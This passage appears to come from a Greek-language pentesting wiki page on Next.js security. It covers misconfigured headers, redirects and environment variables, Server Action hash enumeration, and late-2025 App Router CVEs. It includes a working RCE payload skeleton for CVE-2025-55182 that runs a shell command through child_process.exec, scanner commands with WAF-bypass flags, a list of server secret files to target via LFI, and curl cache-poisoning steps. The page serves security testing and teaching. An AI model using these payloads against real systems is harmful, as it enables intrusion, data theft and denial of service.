Οι κεφαλίδες ασφαλείας ενισχύουν την ασφάλεια της εφαρμογής σας δίνοντας οδηγίες στους browsers για το πώς να χειριστούν το περιεχόμενο. Βοηθούν στη μείωση διαφόρων επιθέσεων όπως Cross-Site Scripting (XSS), Clickjacking, και MIME type sniffing:

- Content Security Policy (CSP)
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security (HSTS)
- Referrer Policy

**Παραδείγματα:**
```javascript
// next.config.js

module.exports = {
async headers() {
return [
{
source: "/(.*)", // Apply to all routes
headers: [
{
key: "X-Frame-Options",
value: "DENY",
},
{
key: "Content-Security-Policy",
value:
"default-src *; script-src 'self' 'unsafe-inline' 'unsafe-eval';",
},
{
key: "X-Content-Type-Options",
value: "nosniff",
},
{
key: "Strict-Transport-Security",
value: "max-age=63072000; includeSubDomains; preload", // Enforces HTTPS
},
{
key: "Referrer-Policy",
value: "no-referrer", // Completely hides referrer
},
// Additional headers...
],
},
]
},
}
```
</details>

<details>

<summary>Ρυθμίσεις βελτιστοποίησης εικόνων</summary>

Next.js βελτιστοποιεί τις εικόνες για απόδοση, αλλά λανθασμένες ρυθμίσεις μπορούν να οδηγήσουν σε ευπάθειες ασφαλείας, όπως το να επιτρέψουν σε μη αξιόπιστες πηγές να εισάγουν κακόβουλο περιεχόμενο.

**Κακό Παράδειγμα Διαμόρφωσης:**
```javascript
// next.config.js

module.exports = {
images: {
domains: ["*"], // Allows images from any domain
},
}
```
**Πρόβλημα:**

- **`'*'`:** Επιτρέπει τη φόρτωση εικόνων από οποιαδήποτε εξωτερική πηγή, συμπεριλαμβανομένων μη αξιόπιστων ή κακόβουλων τομέων. Οι επιτιθέμενοι μπορούν να φιλοξενήσουν εικόνες που περιέχουν κακόβουλα payloads ή περιεχόμενο που παραπλανεί τους χρήστες.
- Ένα άλλο πρόβλημα μπορεί να είναι να επιτρέπεται ένα domain **όπου ο καθένας μπορεί να ανεβάσει μια εικόνα** (όπως `raw.githubusercontent.com`)

**Πώς το εκμεταλλεύονται οι επιτιθέμενοι:**

Εισάγοντας εικόνες από κακόβουλες πηγές, οι επιτιθέμενοι μπορούν να πραγματοποιήσουν phishing attacks, να εμφανίσουν παραπλανητικές πληροφορίες ή να εκμεταλλευτούν ευπάθειες σε βιβλιοθήκες απόδοσης εικόνων.

</details>

<details>

<summary>Environment Variables Exposure</summary>

Διαχειριστείτε ευαίσθητες πληροφορίες όπως API keys και διαπιστευτήρια βάσης δεδομένων με ασφάλεια χωρίς να τα εκθέτετε στον client.

#### a. Αποκάλυψη Ευαίσθητων Μεταβλητών

**Κακό Παράδειγμα Διαμόρφωσης:**
```javascript
// next.config.js

module.exports = {
env: {
SECRET_API_KEY: process.env.SECRET_API_KEY, // Not exposed to the client
NEXT_PUBLIC_API_URL: process.env.NEXT_PUBLIC_API_URL, // Correctly prefixed for exposure to client
},
}
```
**Problem:**

- **`SECRET_API_KEY`:** Χωρίς το πρόθεμα `NEXT_PUBLIC_`, το Next.js δεν εκθέτει μεταβλητές στον client. Ωστόσο, αν προστεθεί κατά λάθος πρόθεμα (π.χ. `NEXT_PUBLIC_SECRET_API_KEY`), γίνεται προσβάσιμο από τον client.

**How attackers abuse it:**

Αν ευαίσθητες μεταβλητές εκτεθούν στον client, οι επιτιθέμενοι μπορούν να τις ανακτήσουν εξετάζοντας τον client-side κώδικα ή τα network requests, αποκτώντας μη εξουσιοδοτημένη πρόσβαση σε APIs, βάσεις δεδομένων ή άλλες υπηρεσίες.

</details>

<details>

<summary>Ανακατευθύνσεις</summary>

Διαχειριστείτε τις ανακατευθύνσεις URL και τα rewrites εντός της εφαρμογής σας, διασφαλίζοντας ότι οι χρήστες κατευθύνονται σωστά χωρίς να εισάγετε ευπάθειες open redirect.

#### a. Open Redirect Vulnerability

**Κακό Παράδειγμα Διαμόρφωσης:**
```javascript
// next.config.js

module.exports = {
async redirects() {
return [
{
source: "/redirect",
destination: (req) => req.query.url, // Dynamically redirects based on query parameter
permanent: false,
},
]
},
}
```
**Πρόβλημα:**

- **Δυναμικός Προορισμός:** Επιτρέπει στους χρήστες να καθορίζουν οποιονδήποτε URL, επιτρέποντας επιθέσεις open redirect.
- **Εμπιστοσύνη στις Εισόδους Χρήστη:** Οι ανακατευθύνσεις σε URLs που παρέχονται από χρήστες χωρίς επικύρωση μπορεί να οδηγήσουν σε phishing, malware distribution ή credential theft.

**Πώς το εκμεταλλεύονται οι επιτιθέμενοι:**

Οι επιτιθέμενοι μπορούν να δημιουργήσουν URLs που φαίνεται να προέρχονται από το domain σας αλλά ανακατευθύνουν τους χρήστες σε κακόβουλους ιστότοπους. Για παράδειγμα:
```bash
https://yourdomain.com/redirect?url=https://malicious-site.com
```
Χρήστες που εμπιστεύονται το αρχικό domain μπορεί να πλοηγηθούν σε επιβλαβείς ιστοσελίδες χωρίς να το γνωρίζουν.

</details>

<details>

<summary>Διαμόρφωση Webpack</summary>

Προσαρμόστε τις ρυθμίσεις Webpack για την εφαρμογή σας Next.js, κάτι που μπορεί ακούσια να εισαγάγει ευπάθειες ασφαλείας αν δεν αντιμετωπιστεί με προσοχή.

#### a. Έκθεση Ευαίσθητων modules

**Παράδειγμα Κακής Διαμόρφωσης:**
```javascript
// next.config.js

module.exports = {
webpack: (config, { isServer }) => {
if (!isServer) {
config.resolve.alias["@sensitive"] = path.join(__dirname, "secret-folder")
}
return config
},
}
```
**Πρόβλημα:**

- **Αποκάλυψη ευαίσθητων διαδρομών:** Η δημιουργία alias σε ευαίσθητους καταλόγους και η επιτρεπόμενη πρόσβαση από την πλευρά του client μπορεί να leak εμπιστευτικές πληροφορίες.
- **Συσκευασία μυστικών:** Εάν ευαίσθητα αρχεία πακεταριστούν για τον client, τα περιεχόμενά τους γίνονται προσβάσιμα μέσω source maps ή με την επιθεώρηση του client-side κώδικα.

**Πώς το εκμεταλλεύονται οι επιτιθέμενοι:**

Οι επιτιθέμενοι μπορούν να αποκτήσουν πρόσβαση ή να ανασυνθέσουν τη δομή καταλόγων της εφαρμογής, ενδεχομένως εντοπίζοντας και εκμεταλλευόμενοι ευαίσθητα αρχεία ή δεδομένα.

</details>

### `pages/_app.js` και `pages/_document.js`

#### **`pages/_app.js`**

**Σκοπός:** Αντικαθιστά το προεπιλεγμένο component App, επιτρέποντας κοινή κατάσταση, στυλ και στοιχεία διάταξης.

**Περιπτώσεις χρήσης:**

- Ενσωμάτωση global CSS.
- Προσθήκη wrapper για τη διάταξη.
- Ενσωμάτωση βιβλιοθηκών διαχείρισης κατάστασης.

**Παράδειγμα:**
```jsx
// pages/_app.js
import "../styles/globals.css"

function MyApp({ Component, pageProps }) {
return <Component {...pageProps} />
}

export default MyApp
```
#### **`pages/_document.js`**

**Σκοπός:** Αντικαθιστά το προεπιλεγμένο Document, επιτρέποντας την παραμετροποίηση των ετικετών `<html>` και `<body>`.

**Χρήσεις:**

- Τροποποίηση των `<html>` ή `<body>` ετικετών.
- Προσθήκη meta tags ή προσαρμοσμένων scripts.
- Ενσωμάτωση γραμματοσειρών τρίτων.

**Παράδειγμα:**
```jsx
// pages/_document.js
import Document, { Html, Head, Main, NextScript } from "next/document"

class MyDocument extends Document {
render() {
return (
<Html lang="en">
<Head>{/* Custom fonts or meta tags */}</Head>
<body>
<Main />
<NextScript />
</body>
</Html>
)
}
}

export default MyDocument
```
### Προσαρμοσμένος Διακομιστής (Προαιρετικό)

**Σκοπός:** Ενώ το Next.js περιλαμβάνει έναν ενσωματωμένο διακομιστή, μπορείτε να δημιουργήσετε έναν προσαρμοσμένο διακομιστή για προχωρημένες περιπτώσεις χρήσης, όπως προσαρμοσμένη δρομολόγηση ή ενσωμάτωση με υπάρχουσες υπηρεσίες backend.

**Σημείωση:** Η χρήση προσαρμοσμένου διακομιστή μπορεί να περιορίσει τις επιλογές ανάπτυξης, ιδιαίτερα σε πλατφόρμες όπως η Vercel που βελτιστοποιούν για τον ενσωματωμένο διακομιστή του Next.js.

**Παράδειγμα:**
```javascript
// server.js
const express = require("express")
const next = require("next")

const dev = process.env.NODE_ENV !== "production"
const app = next({ dev })
const handle = app.getRequestHandler()

app.prepare().then(() => {
const server = express()

// Custom route
server.get("/a", (req, res) => {
return app.render(req, res, "/a")
})

// Default handler
server.all("*", (req, res) => {
return handle(req, res)
})

server.listen(3000, (err) => {
if (err) throw err
console.log("> Ready on http://localhost:3000")
})
})
```
---

## Πρόσθετες Αρχιτεκτονικές και Ζητήματα Ασφαλείας

### Μεταβλητές Περιβάλλοντος και Διαμόρφωση

**Σκοπός:** Διαχείριση ευαίσθητων πληροφοριών και ρυθμίσεων διαμόρφωσης εκτός του codebase.

**Καλύτερες Πρακτικές:**

- **Χρησιμοποιήστε αρχεία `.env`:** Αποθηκεύστε μεταβλητές όπως κλειδιά API σε `.env.local` (αποκλεισμένα από τον έλεγχο έκδοσης).
- **Πρόσβαση σε μεταβλητές με ασφάλεια:** Χρησιμοποιήστε `process.env.VARIABLE_NAME` για πρόσβαση στις μεταβλητές περιβάλλοντος.
- **Μην εκθέτετε ποτέ μυστικά στο Client:** Βεβαιωθείτε ότι οι ευαίσθητες μεταβλητές χρησιμοποιούνται μόνο server-side.

**Παράδειγμα:**
```javascript
// next.config.js
module.exports = {
env: {
API_KEY: process.env.API_KEY, // Accessible on both client and server
SECRET_KEY: process.env.SECRET_KEY, // Be cautious if accessible on the client
},
}
```
**Σημείωση:** Για να περιορίσετε μεταβλητές μόνο στο server-side, παραλείψτε τις από το αντικείμενο `env` ή προσθέστε πρόθεμα `NEXT_PUBLIC_` για να τις εκθέσετε στον client.

### Χρήσιμα αρχεία του server προς στόχευση μέσω LFI/download endpoints

Εάν βρείτε ένα path traversal ή download API σε μια εφαρμογή Next.js, στοχεύστε compiled artifacts που leak server-side secrets και auth logic:

- `.env` / `.env.local` για session secrets και provider credentials.
- `.next/routes-manifest.json` και `.next/build-manifest.json` για πλήρη λίστα routes.
- `.next/server/pages/api/auth/[...nextauth].js` για ανάκτηση της μεταγλωττισμένης διαμόρφωσης NextAuth (συχνά περιέχει fallback passwords όταν οι τιμές `process.env` δεν έχουν οριστεί).
- `next.config.js` / `next.config.mjs` για την επισκόπηση rewrites, redirects και middleware routing.

### Authentication and Authorization

**Προσέγγιση:**

- **Session-Based Authentication:** Χρησιμοποιήστε cookies για τη διαχείριση των user sessions.
- **Token-Based Authentication:** Υλοποιήστε JWTs για authentication χωρίς κατάσταση.
- **Third-Party Providers:** Ενσωματώστε OAuth providers (π.χ., Google, GitHub) χρησιμοποιώντας βιβλιοθήκες όπως `next-auth`.

**Πρακτικές Ασφάλειας:**

- **Secure Cookies:** Ορίστε τα attributes `HttpOnly`, `Secure` και `SameSite`.
- **Password Hashing:** Πάντα κάντε hash τους κωδικούς πριν τους αποθηκεύσετε.
- **Input Validation:** Αποτρέψτε injection attacks με την επικύρωση και τον καθαρισμό (sanitizing) των εισόδων.

**Παράδειγμα:**
```javascript
// pages/api/login.js
import { sign } from "jsonwebtoken"
import { serialize } from "cookie"

export default async function handler(req, res) {
const { username, password } = req.body

// Validate user credentials
if (username === "admin" && password === "password") {
const token = sign({ username }, process.env.JWT_SECRET, {
expiresIn: "1h",
})
res.setHeader(
"Set-Cookie",
serialize("auth", token, {
path: "/",
httpOnly: true,
secure: true,
sameSite: "strict",
})
)
res.status(200).json({ message: "Logged in" })
} else {
res.status(401).json({ error: "Invalid credentials" })
}
}
```
### Βελτιστοποίηση Απόδοσης

**Στρατηγικές:**

- **Βελτιστοποίηση εικόνων:** Χρησιμοποιήστε το component `next/image` του Next.js για αυτόματη βελτιστοποίηση εικόνων.
- **Διαχωρισμός κώδικα:** Εκμεταλλευτείτε τα dynamic imports για να χωρίσετε τον κώδικα και να μειώσετε τον αρχικό χρόνο φόρτωσης.
- **Caching:** Εφαρμόστε στρατηγικές caching για τις απαντήσεις API και τα στατικά αρχεία.
- **Lazy Loading:** Φορτώστε components ή αρχεία μόνο όταν χρειάζονται.

**Παράδειγμα:**
```jsx
// Dynamic Import with Code Splitting
import dynamic from "next/dynamic"

const HeavyComponent = dynamic(() => import("../components/HeavyComponent"), {
loading: () => <p>Loading...</p>,
})
```
## Next.js Server Actions Enumeration (hash to function name via source maps)

Το σύγχρονο Next.js χρησιμοποιεί “Server Actions” που εκτελούνται στον server αλλά καλούνται από τον client. Σε production αυτές οι κλήσεις είναι αδιαφανείς: όλα τα POSTs καταλήγουν σε ένα κοινό endpoint και διαχωρίζονται από ένα build-specific hash που αποστέλλεται στην κεφαλίδα `Next-Action`. Παράδειγμα:
```http
POST /
Next-Action: a9f8e2b4c7d1...
```
Όταν το `productionBrowserSourceMaps` είναι ενεργοποιημένο, τα minified JS chunks περιέχουν κλήσεις προς την `createServerReference(...)` που leak αρκετή δομή (συν τους αντίστοιχους source maps) για να ανακτήσετε έναν συσχετισμό μεταξύ του action hash και του αρχικού ονόματος της συνάρτησης. Αυτό σας επιτρέπει να μεταφράσετε τα hashes που παρατηρούνται στο `Next-Action` σε συγκεκριμένους στόχους όπως `deleteUserAccount()` ή `exportFinancialData()`.

### Προσέγγιση εξαγωγής (regex on minified JS + optional source maps)

Αναζητήστε στα κατεβασμένα JS chunks την `createServerReference` και εξάγετε το hash και το function/source symbol. Δύο χρήσιμα μοτίβα:
```regex
# Strict pattern for standard minification
createServerReference\)"([a-f0-9]{40,})",\w+\.callServer,void 0,\w+\.findSourceMapURL,"([^"]+)"\)

# Flexible pattern handling various minification styles
createServerReference[^\"]*"([a-f0-9]{40,})"[^\"]*"([^"]+)"\s*\)
```
- Ομάδα 1: server action hash (40+ hex chars)
- Ομάδα 2: symbol or path που μπορεί να επιλυθεί στο αρχικό όνομα συνάρτησης μέσω του source map όταν υπάρχει

If the script advertises a source map (trailer comment `//# sourceMappingURL=<...>.map`), fetch it and resolve the symbol/path to the original function name.

### Practical workflow

- Passive discovery while browsing: capture requests with `Next-Action` headers and JS chunk URLs.
- Fetch the referenced JS bundles and accompanying `*.map` files (when present).
- Run the regex above to build a hash↔name dictionary.
- Use the dictionary to target testing:
- Name-driven triage (e.g., `transferFunds`, `exportFinancialData`).
- Track coverage across builds by function name (hashes rotate across builds).

### Exercising hidden actions (template-based request)

Take a valid POST observed in-proxy as a template and swap the `Next-Action` value to target another discovered action:
```http
# Before
Next-Action: a9f8e2b4c7d1

# After
Next-Action: b7e3f9a2d8c5
```
Επανεκτέλεση σε Repeater και δοκιμή authorization, input validation και business logic για ενέργειες που διαφορετικά δεν είναι προσβάσιμες.

### Burp automation

- NextjsServerActionAnalyzer (Burp extension) αυτοματοποιεί τα παραπάνω στο Burp:
- Σαρώνει το proxy history για JS chunks, εξάγει `createServerReference(...)` entries, και αναλύει source maps όταν είναι διαθέσιμα.
- Διατηρεί ένα searchable hash↔function-name dictionary και κάνει de-duplicates μεταξύ builds με βάση το function name.
- Μπορεί να εντοπίσει ένα έγκυρο template POST και να ανοίξει μια έτοιμη για αποστολή καρτέλα Repeater με το hash της target action αντικατεστημένο.
- Repo: https://github.com/Adversis/NextjsServerActionAnalyzer

### Σημειώσεις και περιορισμοί

- Απαιτεί να είναι ενεργοποιημένο το `productionBrowserSourceMaps` στην production για να ανακτήσει ονόματα από bundles/source maps.
- Το Function-name disclosure από μόνο του δεν είναι ευπάθεια· χρησιμοποιήστε το για να καθοδηγήσετε την ανακάλυψη και να δοκιμάσετε την authorization κάθε action.

### React Server Components Flight protocol deserialization RCE (CVE-2025-55182)

Next.js App Router deployments that expose Server Actions on `react-server-dom-webpack` **19.0.0–19.2.0 (Next.js 15.x/16.x)** περιέχουν κρίσιμη server-side prototype pollution κατά τη deserialization των **Flight** chunks. Με τη δημιουργία `$` αναφορών μέσα σε ένα Flight payload, ένας επιτιθέμενος μπορεί να μετακινηθεί από μολυσμένα prototypes σε arbitrary JavaScript execution και στη συνέχεια σε OS command execution μέσα στη Node.js διαδικασία.

{{#ref}}
../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/README.md
{{#endref}}

#### Αλυσίδα επίθεσης σε Flight chunks

1. **Prototype pollution primitive:** Set `"then": "$1:__proto__:then"` so that the resolver writes a `then` function on `Object.prototype`. Any plain object processed afterwards becomes a thenable, letting the attacker influence async control flow inside RSC internals.
2. **Rebinding to the global `Function` constructor:** Point `_response._formData.get` at `"$1:constructor:constructor"`. During resolution, `object.constructor` → `Object`, and `Object.constructor` → `Function`, so future calls to `_formData.get()` actually execute `Function(...)`.
3. **Code execution via `_prefix`:** Place JavaScript source in `_response._prefix`. When the polluted `_formData.get` is invoked, the framework evaluates `Function(_prefix)(...)`, so the injected JS can run `require('child_process').exec()` or any other Node primitive.

#### Σκελετός payload
```json
{
"then": "$1:__proto__:then",
"status": "resolved_model",
"reason": -1,
"value": "{\"then\":\"$B1337\"}",
"_response": {
"_prefix": "require('child_process').exec('id')",
"_chunks": "$Q2",
"_formData": { "get": "$1:constructor:constructor" }
}
}
```
#### Χαρτογράφηση της έκθεσης των React Server Functions

React Server Functions (RSF) είναι οποιεσδήποτε συναρτήσεις που περιλαμβάνουν την οδηγία 'use server';. Κάθε form action, mutation, ή fetch helper που δεσμεύεται σε μία από αυτές τις συναρτήσεις γίνεται ένα RSC Flight endpoint που πρόθυμα θα deserialize attacker-supplied payloads. Χρήσιμα βήματα αναγνώρισης που προκύπτουν από τις αξιολογήσεις React2Shell:

- **Στατική απογραφή:** αναζητήστε την οδηγία για να κατανοήσετε πόσα RSFs εκτίθενται αυτόματα από το framework.
```bash
rg -n "'use server';" -g"*.{js,ts,jsx,tsx}" app/
```
- **App Router defaults:** `create-next-app` ενεργοποιεί τον App Router + τον κατάλογο `app/` από προεπιλογή, κάτι που σιωπηλά μετατρέπει κάθε route σε endpoint ικανό για RSC. Τα assets του App Router όπως `/_next/static/chunks/app/` ή απαντήσεις που stream-άρουν Flight chunks πάνω από `text/x-component` είναι ισχυρά διακριτικά εκτεθειμένα στο Internet.
- **Implicitly vulnerable RSC deployments:** Η ίδια η ανακοίνωση της React σημειώνει ότι εφαρμογές που περιλαμβάνουν το RSC runtime μπορεί να είναι εκμεταλλεύσιμες **ακόμη και χωρίς ρητά RSFs**, οπότε θεωρήστε οποιοδήποτε build που χρησιμοποιεί `react-server-dom-*` 19.0.0–19.2.0 ύποπτο.
- **Other frameworks bundling RSC:** Vite RSC, Parcel RSC, React Router RSC preview, RedwoodSDK, Waku, etc. επαναχρησιμοποιούν τον ίδιο serializer και κληρονομούν την ίδια απομακρυσμένη επιφάνεια επίθεσης μέχρι να ενσωματώσουν patched React builds.

#### Version coverage (React2Shell)

- `react-server-dom-webpack`, `react-server-dom-parcel`, `react-server-dom-turbopack`: **ευάλωτα** στις 19.0.0, 19.1.0–19.1.1 και 19.2.0; **επιδιορθωμένα** στις 19.0.1, 19.1.2 και 19.2.1 αντίστοιχα.
- **Next.js stable:** Οι App Router εκδόσεις 15.0.0–16.0.6 ενσωματώνουν το ευάλωτο RSC stack. Τα patch trains 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7 περιέχουν διορθωμένες εξαρτήσεις, οπότε οποιοδήποτε build κάτω από αυτές τις εκδόσεις είναι υψηλής αξίας.
- **Next.js canary:** `14.3.0-canary.77+` επίσης περιλαμβάνει το ελαττωματικό runtime και αυτή τη στιγμή δεν υπάρχουν patched canary drops, καθιστώντας αυτά τα διακριτικά ισχυρούς υποψήφιους για εκμετάλλευση.

#### Απομακρυσμένο ανιχνευτικό oracle

Το Assetnote’s [`react2shell-scanner`](https://github.com/assetnote/react2shell-scanner) στέλνει ένα κατασκευασμένο multipart Flight αίτημα σε υποψήφιες διαδρομές και παρατηρεί τη συμπεριφορά στην πλευρά του server:

- **Default mode** εκτελεί ένα ντετερμινιστικό RCE payload (μαθηματική πράξη που αντικατοπτρίζεται μέσω `X-Action-Redirect`) αποδεικνύοντας εκτέλεση κώδικα.
- **`--safe-check` mode** επιχειρησιακά παραμορφώνει το Flight μήνυμα έτσι ώστε οι patched servers να επιστρέφουν `200/400`, ενώ οι ευάλωτοι στόχοι εκπέμπουν `HTTP/500` απαντήσεις που περιέχουν την υποσυμβολοσειρά `E{"digest"` μέσα στο σώμα. Αυτό το ζευγάρι `(500 + digest)` είναι επί του παρόντος το πιο αξιόπιστο απομακρυσμένο oracle που έχουν δημοσιεύσει οι αμυνόμενοι.
- Οι ενσωματωμένες επιλογές `--waf-bypass`, `--vercel-waf-bypass`, και `--windows` προσαρμόζουν τη διάταξη του payload, προσθέτουν junk στην αρχή, ή αντικαθιστούν εντολές OS ώστε να μπορείτε να ανιχνεύσετε πραγματικά Internet assets.
```bash
python3 scanner.py -u https://target.tld --path /app/api/submit --safe-check
python3 scanner.py -l hosts.txt -t 20 --waf-bypass -o vulnerable.json
```
### Άλλα πρόσφατα ζητήματα του App Router (τέλη 2025)

1. **RSC DoS & source disclosure (CVE-2025-55184 / CVE-2025-67779 / CVE-2025-55183)** – κακώς σχηματισμένα Flight payloads μπορούν να βάλουν τον RSC resolver σε άπειρο βρόχο (pre-auth DoS) ή να αναγκάσουν σειριοποίηση του compiled Server Function code για άλλες ενέργειες. Οι builds του App Router ≥13.3 επηρεάζονται μέχρι να εφαρμοστεί patch· οι 15.0.x–16.0.x χρειάζονται τις συγκεκριμένες γραμμές patch από το upstream advisory. Χρησιμοποιήστε ξανά το κανονικό Server Action path αλλά streamάρετε ένα `text/x-component` body με καταχρηστικές `$` αναφορές. Πίσω από CDN η κρεμασμένη σύνδεση παραμένει ανοιχτή λόγω cache timeouts, κάνοντας το DoS φθηνό.
- **Συμβουλή Triage:** Οι μη-patched στόχοι επιστρέφουν `500` με `E{"digest"` μετά από κακώς σχηματισμένα Flight payloads· τα patched builds επιστρέφουν `400/200`. Δοκιμάστε οποιοδήποτε endpoint που ήδη streamάρει Flight chunks (ψάξτε για `Next-Action` headers ή `text/x-component` responses) και replay με τροποποιημένο payload.

2. **RSC cache poisoning (CVE-2025-49005, App Router 15.3.0–15.3.2)** – το απούσα `Vary` επέτρεψε σε μια `Accept: text/x-component` απόκριση να μπει στην cache και να σερβιριστεί σε browsers που περίμεναν HTML. Ένα μόνο priming request μπορεί να αντικαταστήσει τη σελίδα με raw RSC payloads. PoC flow:
```bash
# Prime CDN with an RSC response
curl -k -H "Accept: text/x-component" "https://target/app/dashboard" > /dev/null
# Immediately fetch without Accept (victim view)
curl -k "https://target/app/dashboard" | head
```
Αν η δεύτερη απόκριση επιστρέφει JSON Flight data αντί για HTML, το route είναι poisonable. Κάντε purge cache μετά τη δοκιμή.

## Αναφορές

- [Pentesting Next.js Server Actions — A Burp Extension for Hash-to-Function Mapping](https://www.adversis.io/blogs/pentesting-next-js-server-actions)
- [NextjsServerActionAnalyzer (Burp extension)](https://github.com/Adversis/NextjsServerActionAnalyzer)
- [CVE-2025-55182 React Server Components Remote Code Execution Exploit Tool](https://github.com/Spritualkb/CVE-2025-55182-exp)
- [CVE-2025-55182 & CVE-2025-66478 React2Shell – All You Need to Know](https://jfrog.com/blog/2025-55182-and-2025-66478-react2shell-all-you-need-to-know/)
- [0xdf – HTB Previous (Next.js middleware bypass, static export recon, NextAuth config leak)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [assetnote/react2shell-scanner](https://github.com/assetnote/react2shell-scanner)
- [Next.js Security Update: December 11, 2025 (CVE-2025-55183/55184/67779)](https://nextjs.org/blog/security-update-2025-12-11)
- [GHSA-r2fc-ccr8-96c4 / CVE-2025-49005: App Router cache poisoning](https://github.com/advisories/GHSA-r2fc-ccr8-96c4)

{{#include ../../banners/hacktricks-training.md}}
